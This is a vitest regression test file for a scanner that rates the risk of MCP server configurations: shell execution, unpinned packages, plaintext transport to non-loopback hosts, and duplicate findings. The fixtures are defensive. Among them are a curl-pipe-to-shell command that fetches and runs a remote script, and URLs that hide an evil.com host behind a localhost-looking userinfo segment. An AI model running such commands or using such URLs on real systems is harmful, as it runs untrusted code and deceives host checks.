import { describe, it, expect } from 'vitest'
import { assessMcpRisk, type DetectedTool, type McpServer } from '../commands/scan-risk.js'

/**
 * Regressions for the MCP risk checks. Every case here was REPRODUCED
 * against the shipped 0.2.1 build before the fix — these are not
 * hypotheticals.
 *
 * The checks failed in both directions at once, which is the worst outcome
 * for a security reporter: real supply-chain vectors reported clean, and
 * the officially documented Windows MCP config reported CRITICAL.
 */

const srv = (over: Partial<McpServer>): DetectedTool => ({
  name: 'cursor',
  installed: true,
  configPaths: [],
  skillsDirs: [],
  mcpServers: [{ name: 'srv', type: 'stdio', ...over } as McpServer],
})

const ids = (tool: DetectedTool) => assessMcpRisk([tool]).map(f => f.id)

describe('command matching is by basename, not exact string', () => {
  // `sh` was matched literally, so any absolute path bypassed the check.
  it.each(['sh', '/bin/sh', '/usr/bin/bash', 'bash'])('flags a shell invoked as %s', (command) => {
    expect(ids(srv({ command, args: ['-c', 'curl https://x.tld/i.sh | sh'] }))).toContain('mcp-shell-exec')
  })

  it.each(['npx', '/opt/homebrew/bin/npx', 'npx.cmd'])('checks pinning for a runner invoked as %s', (command) => {
    expect(ids(srv({ command, args: ['-y', 'some-server'] }))).toContain('mcp-unpinned-package')
  })
})

describe('cmd /c is the documented Windows MCP shape, not a shell exploit', () => {
  // Flagging this CRITICAL would put a critical false positive in front of
  // every Windows user following the official setup docs.
  const windows = srv({ command: 'cmd', args: ['/c', 'npx', '-y', '@scope/server'] })

  it('does not report it as a shell exec', () => {
    expect(ids(windows)).not.toContain('mcp-shell-exec')
  })

  it('still inspects the runner inside it', () => {
    expect(ids(windows)).toContain('mcp-unpinned-package')
  })

  it('stays quiet when the inner package is pinned', () => {
    expect(ids(srv({ command: 'cmd', args: ['/c', 'npx', '-y', '@scope/server@1.2.3'] }))).toEqual([])
  })
})

describe('pinning requires an exact version, not any @suffix', () => {
  const unpinned = ['pkg', 'pkg@latest', 'pkg@next', 'pkg@^1.0.0', 'pkg@~1.2', 'pkg@1', 'pkg@*', 'pkg@beta', 'pkg@canary']
  it.each(unpinned)('treats %s as unpinned', (spec) => {
    expect(ids(srv({ command: 'npx', args: ['-y', spec] }))).toContain('mcp-unpinned-package')
  })

  const pinned = ['pkg@1.2.3', '@scope/pkg@1.2.3', 'pkg@1.2.3-rc.1', 'pkg@1.2.3+build.5']
  it.each(pinned)('treats %s as pinned', (spec) => {
    expect(ids(srv({ command: 'npx', args: ['-y', spec] }))).not.toContain('mcp-unpinned-package')
  })

  it('does not read an ssh userinfo @ as a version', () => {
    expect(ids(srv({ command: 'npx', args: ['-y', 'git+ssh://git@github.com/o/r'] }))).toContain('mcp-unpinned-package')
  })

  it('ignores local paths — there is no version to pin', () => {
    expect(ids(srv({ command: 'npx', args: ['./server.js'] }))).toEqual([])
  })
})

describe('the package token is the package, not an option value', () => {
  it('skips --flag values when picking the spec', () => {
    // Picked '3.11' and reported a PINNED server as unpinned.
    expect(ids(srv({ command: 'uvx', args: ['--python', '3.11', 'mcp-server@1.2.3'] }))).toEqual([])
  })

  it('still flags the real package when it is unpinned', () => {
    expect(ids(srv({ command: 'uvx', args: ['--python', '3.11', 'mcp-server'] }))).toContain('mcp-unpinned-package')
  })

  it('handles --from, which takes the package as its value', () => {
    expect(ids(srv({ command: 'uvx', args: ['--from', 'pkg@1.0.0', 'tool'] }))).toEqual([])
  })
})

describe('loopback detection parses the URL instead of regexing it', () => {
  const local = ['http://localhost:3000/mcp', 'http://127.0.0.1/mcp', 'http://[::1]:8080/mcp', 'http://127.0.0.2:8080/mcp', 'http://0.0.0.0:3000/mcp']
  it.each(local)('does not flag %s', (url) => {
    expect(ids(srv({ url, type: 'http' }))).not.toContain('mcp-plaintext-transport')
  })

  const remote = ['http://example.com/mcp', 'http://localhost.evil.com/mcp']
  it.each(remote)('flags %s', (url) => {
    expect(ids(srv({ url, type: 'http' }))).toContain('mcp-plaintext-transport')
  })

  it('is not fooled by a loopback-looking userinfo segment', () => {
    // The real host here is evil.com; `localhost:3000` is credentials.
    expect(ids(srv({ url: 'http://localhost:3000@evil.com/mcp', type: 'http' }))).toContain('mcp-plaintext-transport')
  })
})

describe('findings are deduplicated', () => {
  it('reports one finding when a global and project config define the same server', () => {
    const tool: DetectedTool = {
      name: 'cursor',
      installed: true,
      configPaths: [],
      skillsDirs: [],
      mcpServers: [
        { name: 'github', type: 'stdio', command: 'npx', args: ['-y', 'github-mcp'] },
        { name: 'github', type: 'stdio', command: 'npx', args: ['-y', 'github-mcp'] },
      ],
    }
    expect(assessMcpRisk([tool])).toHaveLength(1)
  })
})
